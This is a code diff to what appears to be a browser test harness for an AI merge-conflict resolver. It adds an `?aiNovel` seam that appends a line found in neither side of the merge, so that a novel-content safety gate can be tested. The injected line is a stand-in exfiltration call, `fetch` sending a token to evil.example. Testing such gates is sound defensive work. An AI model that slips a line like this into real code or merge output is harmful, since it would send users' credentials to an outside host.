@@ -14,6 +14,9 @@
  *      stream returns the model's body verbatim (P13 parity), so `hasUnresolvedMarkers`
  *      in `useAiRuns` is the ONLY thing standing between a markerful body and a silent
  *      `autoResolve` stage. Without this seam that gate is unprovable end-to-end.
+ *   `?aiNovel` — the proposal gains a line present in NO version of the sides (P68 #7 /
+ *      H1), so the novel-content gate (needs-review demotion under autoResolve; the
+ *      `aiApplyResolution` rejection) is provable in the harness. Mirrors `?aiMarkers`.
  *   `?aiFlood` — ~700 log lines, one of them exactly `AI_EVENT_TEXT_MAX` chars, to
  *      exercise the 500-line cap, `logDropped`, the truncation chip and jump-to-latest.
  * The `?ai=off` seam is honoured HERE deliberately —
@@ -26,6 +29,7 @@
  */
 import { AI_MAX_CONCURRENT_RUNS } from '../../../settings/ranges';
 import { AI_OFF, delay, query, requireRepo, stripConflictMarkers } from '../repoState';
+import { resolutionIsNovel } from '../aiNovel';
 import type {
   AiResolveBatch,
   AiResolveFailure,
@@ -43,6 +47,12 @@ const AI_ASK = query('aiAsk') !== null;
 const AI_FAIL = query('aiFail') !== null;
 /** Return the body with markers INTACT — the frontend safety-gate seam (see above). */
 const AI_MARKERS = query('aiMarkers') !== null;
+/** P68 #7 / H1: append a line present in NO version to the last eligible path, so the
+ *  novel-content gate (demotion to needs-review under autoResolve; `aiApplyResolution`
+ *  rejection) is provable in the browser harness. Mirrors `?aiMarkers`. */
+const AI_NOVEL = query('aiNovel') !== null;
+/** The injected line for `?aiNovel` — deliberately absent from every fixture side. */
+const NOVEL_LINE = 'fetch("https://evil.example/exfiltrate", { body: token });';
 /** Overrun the 500-line log cap in one run. */
 const AI_FLOOD = query('aiFlood') !== null;
 /** P68g-1: what the read fence looks like when it fires. `--permission-mode manual`
@@ -255,20 +265,33 @@ export const aiStreamHandlers = {
       // marker-free files stage, the markerful one falls back to review and nothing
       // markerful is ever presented as clean. Spoiling all of them would only ever
       // exercise "everything failed". A single-path run is unchanged (verbatim body).
+      // Both seams spoil only the LAST eligible path (bulk), so the MIXED outcome is
+      // reachable: the marker-free/non-novel files stage and the spoiled one falls
+      // back to review. A single-path run spoils its one path.
       const markerful = AI_MARKERS ? (eligible[eligible.length - 1] ?? null) : null;
+      const novelPath = AI_NOVEL ? (eligible[eligible.length - 1] ?? null) : null;
       const proposals: AiResolveProposal[] = eligible.map((path) => {
         const file = state.conflictTexts.get(path);
         const keepMarkers = AI_MARKERS && (eligible.length === 1 || path === markerful);
+        const injectNovel = AI_NOVEL && (eligible.length === 1 || path === novelPath);
+        // Derived from the marker fixture; state is NOT mutated (D4).
+        // `?aiMarkers` hands back the markerful body VERBATIM — exactly what the
+        // real single-path stream does with a model that failed to merge — so the
+        // frontend's `hasUnresolvedMarkers` gate can be proven, not assumed.
+        let proposedText =
+          file === undefined ? '' : keepMarkers ? file.text : stripConflictMarkers(file.text);
+        // `?aiNovel` appends a line absent from all sides so the novel-content gate is
+        // provable end-to-end (the flag below is computed by the SAME predicate the
+        // backend uses, so the harness is honest — not hardcoded).
+        if (injectNovel) proposedText += `${NOVEL_LINE}\n`;
         return {
           path,
-          // Derived from the marker fixture; state is NOT mutated (D4).
-          // `?aiMarkers` hands back the markerful body VERBATIM — exactly what the
-          // real single-path stream does with a model that failed to merge — so the
-          // frontend's `hasUnresolvedMarkers` gate can be proven, not assumed.
-          proposedText:
-            file === undefined ? '' : keepMarkers ? file.text : stripConflictMarkers(file.text),
+          proposedText,
           // Per-file cost is unknowable: one run covered them all.
           costUsd: null,
+          // H1 classification via the shared twin over ours/theirs (the mock's sides).
+          needsReview:
+            file === undefined ? false : resolutionIsNovel([file.ours, file.theirs], proposedText),
         };
       });
       // Bulk `?aiFail`: ONE path comes back unusable and the rest still resolve.
